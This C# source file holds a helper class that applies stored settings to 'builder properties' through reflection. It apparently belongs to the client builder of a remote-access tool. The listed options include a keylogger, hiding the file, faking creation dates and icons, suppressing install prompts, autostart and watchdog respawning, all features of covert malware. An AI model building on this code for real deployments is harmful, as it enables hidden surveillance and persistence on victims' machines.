using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Shared.Client;
using Orcus.Shared.Settings;

namespace Orcus.Shared.Core
{
    /// <summary>
    ///     Some utilities to handle <see cref="IBuilderProperty" />
    /// </summary>
    public static class BuilderPropertyHelper
    {
        /// <summary>
        ///     Get a builder property from a list of <see cref="ClientSetting" />
        /// </summary>
        /// <typeparam name="T">The type of the builder property</typeparam>
        /// <param name="clientSettings">The list the builder property should be taken from</param>
        /// <returns>Return the builder property</returns>
        public static T GetBuilderProperty<T>(this List<ClientSetting> clientSettings) where T : IBuilderProperty, new()
        {
            var propertyType = typeof (T).GetClientSettingTypeName();
            var clientSetting = clientSettings.FirstOrDefault(x => x.SettingsType == propertyType);
            if (clientSetting == null)
                throw new Exception("Could not find setting " + propertyType);

            var builderProperty = new T();
            ApplyProperties(builderProperty, clientSetting.Properties);

            return builderProperty;
        }

        /// <summary>
        ///     Get the type string of a <see cref="IBuilderProperty" /> for a <see cref="ClientSetting" />
        /// </summary>
        /// <param name="type">The type to serialize</param>
        /// <returns>The serialized type</returns>
        public static string GetClientSettingTypeName(this Type type)
        {
            return $"{type.FullName}, {type.Assembly.GetName().Name}";
        }

        /// <summary>
        ///     Apply a list of <see cref="PropertyNameValue" /> on a <see cref="IBuilderProperty" />
        /// </summary>
        /// <param name="builderProperty">The builder property the settings should be applied on</param>
        /// <param name="properties">The properties</param>
        public static void ApplyProperties(IBuilderProperty builderProperty, List<PropertyNameValue> properties)
        {
            var builderPropertyType = builderProperty.GetType();
            foreach (var propertyNameValue in properties)
            {
                var property = builderPropertyType.GetProperty(propertyNameValue.Name);
                if (property == null)
#if DEBUG
                    throw new Exception("Property " + propertyNameValue.Name + " not found");
#else
                    continue;
#endif

                object value = propertyNameValue.Value;
                if (property.GetCustomAttributes(false).OfType<SerializeAsUtcAttribute>().Any())
                {
                    var dateTime = propertyNameValue.Value as DateTime?;
                    if (dateTime.HasValue)
                        value = dateTime.Value.ToLocalTime();
                }

                property.SetValue(builderProperty, value, null);
            }
        }

        /// <summary>
        ///     Get all standard builder property types
        /// </summary>
        /// <returns>Return all standard builder property types</returns>
        public static Type[] GetAllBuilderPropertyTypes()
        {
            return new[]
            {
                typeof (AutostartBuilderProperty), typeof (ChangeAssemblyInformationBuilderProperty),
                typeof (ChangeCreationDateBuilderProperty), typeof (ChangeIconBuilderProperty),
                typeof (ClientTagBuilderProperty), typeof (ConnectionBuilderProperty),
                typeof (DataFolderBuilderProperty), typeof (DefaultPrivilegesBuilderProperty),
                typeof (DisableInstallationPromptBuilderProperty), typeof (FrameworkVersionBuilderProperty),
                typeof (HideFileBuilderProperty), typeof (InstallationLocationBuilderProperty),
                typeof (InstallBuilderProperty), typeof (KeyloggerBuilderProperty), typeof (MutexBuilderProperty),
                typeof (ProxyBuilderProperty), typeof (ReconnectDelayProperty),
                typeof (RequireAdministratorPrivilegesInstallerBuilderProperty), typeof (RespawnTaskBuilderProperty),
                typeof (ServiceBuilderProperty), typeof (SetRunProgramAsAdminFlagBuilderProperty),
                typeof (WatchdogBuilderProperty)
            };
        }

        /// <summary>
        ///     Get all standard builder properties
        /// </summary>
        /// <returns>Return all standard builder properties</returns>
        public static IBuilderProperty[] GetAllBuilderProperties()
        {
            return new IBuilderProperty[]
            {
                new AutostartBuilderProperty(), new ChangeAssemblyInformationBuilderProperty(),
                new ChangeCreationDateBuilderProperty(), new ChangeIconBuilderProperty(), new ClientTagBuilderProperty(),
                new ConnectionBuilderProperty(), new DataFolderBuilderProperty(), new DefaultPrivilegesBuilderProperty(),
                new DisableInstallationPromptBuilderProperty(), new FrameworkVersionBuilderProperty(),
                new HideFileBuilderProperty(), new InstallationLocationBuilderProperty(), new InstallBuilderProperty(),
                new KeyloggerBuilderProperty(), new MutexBuilderProperty(), new ProxyBuilderProperty(),
                new ReconnectDelayProperty(), new RequireAdministratorPrivilegesInstallerBuilderProperty(),
                new RespawnTaskBuilderProperty(), new ServiceBuilderProperty(),
                new SetRunProgramAsAdminFlagBuilderProperty(), new WatchdogBuilderProperty()
            };
        }
    }
}